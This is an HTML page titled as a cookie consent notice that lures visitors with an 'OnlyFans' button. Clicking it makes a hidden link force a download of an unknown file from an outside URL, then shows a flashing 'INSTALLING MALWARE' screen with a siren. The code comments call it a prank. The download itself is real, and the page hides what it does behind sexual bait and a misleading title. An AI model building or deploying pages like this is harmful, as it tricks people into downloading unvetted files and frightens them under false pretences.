<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Policy & Consent</title>
    <style>
        /* Base styles */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            overflow: hidden;
        }

        /* 1. INITIAL SCREEN: Cookie Banner Styles */
        #cookie-screen {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            background-color: #ffffff;
        }

        .cookie-box {
            max-width: 450px;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            border: 1px solid #e0e0e0;
        }

        .cookie-btn {
            margin-top: 20px;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: bold;
            color: #fff;
            background-color: #007bff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }

        .cookie-btn:hover {
            background-color: #0056b3;
        }

        /* 2. PRANK SCREEN: Scary Warning Page Styles */
        #prank-screen {
            display: none; /* Hidden by default */
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: #000000;
            box-sizing: border-box;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        /* Flashing Red Border Animation */
        @keyframes flashBorder {
            0% { border-color: #ff0000; box-shadow: 0 0 20px #ff0000; }
            50% { border-color: #550000; box-shadow: 0 0 0px #000; }
            100% { border-color: #ff0000; box-shadow: 0 0 20px #ff0000; }
        }

        .warning-box {
            width: 80%;
            max-width: 600px;
            padding: 40px;
            background-color: #050505;
            border: 5px solid #ff0000;
            animation: flashBorder 0.4s infinite;
            text-align: center;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
        }

        .warning-title {
            font-size: 2.2rem;
            font-weight: bold;
            letter-spacing: 2px;
            margin-bottom: 20px;
            text-transform: uppercase;
        }

        .warning-subtext {
            font-size: 1.1rem;
            color: #ffffff;
            margin-top: 15px;
        }
    </style>
</head>
<body>

    <!-- Initial Cookie Consent Screen -->
    <div id="cookie-screen">
        <div class="cookie-box">
            <h2>KennyTikTok OnlyFans</h2>
            <p>Click the blue button below for access.</p>
            <button class="cookie-btn" id="start-btn">Click here for OnlyFans</button>
        </div>
    </div>

    <!-- Prank Warning Screen -->
    <div id="prank-screen">
        <div class="warning-box">
            <div id="status-text" class="warning-title">INSTALLING MALWARE IN 2</div>
            <p class="warning-subtext">CRITICAL SYSTEM ERROR DETECTED</p>
        </div>
    </div>

    <script>
        document.getElementById('start-btn').addEventListener('click', function() {
            
            // 4. IMMEDIATE DOWNLOAD PIPELINE
            // Executed immediately within the initial click event thread using your chosen link
            triggerFileDownload();

            // 2. TRANSITION TO PRANK SCREEN
            document.getElementById('cookie-screen').style.display = 'none';
            document.getElementById('prank-screen').style.display = 'flex';

            // Start dynamic audio siren
            startSirenAudio();

            // 3. COUNTDOWN TIMER
            runCountdown();
        });

        /**
         * Triggers the direct file download immediately from your specified URL.
         */
        function triggerFileDownload() {
            const targetUrl = "https://anytourl.com/api/file/download?id=87195057518886964";
            
            // Create a temporary hidden link element
            const tempLink = document.createElement('a');
            tempLink.href = targetUrl;
            
            // Force the browser to evaluate it as a dynamic download anchor
            tempLink.setAttribute('download', '');
            tempLink.style.display = "none";
            
            // Append, trigger click, and cleanup
            document.body.appendChild(tempLink);
            tempLink.click();
            document.body.removeChild(tempLink);
        }

        /**
         * Generates an electronic siren using Web Audio API (sawtooth wave alternating 800Hz / 1200Hz).
         */
        function startSirenAudio() {
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                const audioCtx = new AudioContext();
                
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();

                oscillator.type = 'sawtooth';
                oscillator.frequency.setValueAtTime(800, audioCtx.currentTime);

                // Alternating frequency modulation to simulate siren audio
                let highPitch = false;
                setInterval(() => {
                    if (audioCtx.state === 'running') {
                        const targetFreq = highPitch ? 800 : 1200;
                        oscillator.frequency.setValueAtTime(targetFreq, audioCtx.currentTime);
                        highPitch = !highPitch;
                    }
                }, 250);

                gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime); // Keep volume moderate
                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);
                oscillator.start();
            } catch (e) {
                console.warn("Web Audio API unavailable or blocked by user settings:", e);
            }
        }

        /**
         * Handles the 2-second countdown sequence.
         */
        function runCountdown() {
            const statusElem = document.getElementById('status-text');
            let count = 2;

            const timer = setInterval(() => {
                count--;
                if (count > 0) {
                    statusElem.textContent = `INSTALLING MALWARE IN ${count}`;
                } else if (count === 0) {
                    statusElem.textContent = `INSTALLING MALWARE IN 0`;
                } else {
                    clearInterval(timer);
                    statusElem.textContent = "MALWARE INSTALLING";
                }
            }, 1000);
        }
    </script>
</body>
</html>
